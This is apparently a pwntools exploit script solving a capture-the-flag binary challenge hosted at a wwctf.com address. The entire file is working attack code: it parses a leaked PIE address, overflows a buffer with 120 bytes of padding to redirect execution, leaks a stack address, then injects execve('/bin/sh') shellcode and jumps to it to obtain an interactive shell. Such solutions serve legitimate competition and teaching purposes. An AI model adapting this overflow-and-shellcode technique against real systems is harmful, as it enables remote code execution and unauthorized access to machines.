#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

gs = '''
b main
b *main+161
'''

context.update(arch='amd64',os='linux')

def start():
    if args.GDB:
        return gdb.debug("./chall", gdbscript=gs)
    if args.REMOTE:
        return remote("whiterabbit.chal.wwctf.com", 1337)
    else:
        return process("./chall")

# Plan:

# Addresses

# Functions

io = start()
padding = 120



io.recvuntil(b'> ', timeout=5)

pie_leak = io.recvline()

pie_leak = pie_leak.strip(b'\n')

pie_leak = int(pie_leak[2:], 16)

log.info("pieleak: %s"%hex(pie_leak))

main = pie_leak

main_off = 0x1180

ret_off = 0x101a

pie_base = pie_leak - main_off

log.info("piebase: %s"%hex(pie_base))

ret_off = 0x000000000000101a

ret_gadget = ret_off + pie_base

# Make payload

# Shellcode is 24 bytes
shellcode = asm('\n'.join([
    'movabs rdi, 0x68732f6e69622f',
    'push rdi',
    'mov rdi, rsp',
    'and rsi, rdx',
    'xor rax, rax',
    'mov al, 59',
    'syscall',
]))


payload = b'A'*padding + p64(main+161)

io.sendline(payload)

io.recv() # recv rabbit
stack_leak = u64(io.recv()[24:30].ljust(8,b"\x00"))
stack_leak

log.info("Stack @ %s" % hex(stack_leak))

payload = shellcode + b'A'*(padding-len(shellcode)) + p64(stack_leak)

io.sendline(payload)

io.interactive()
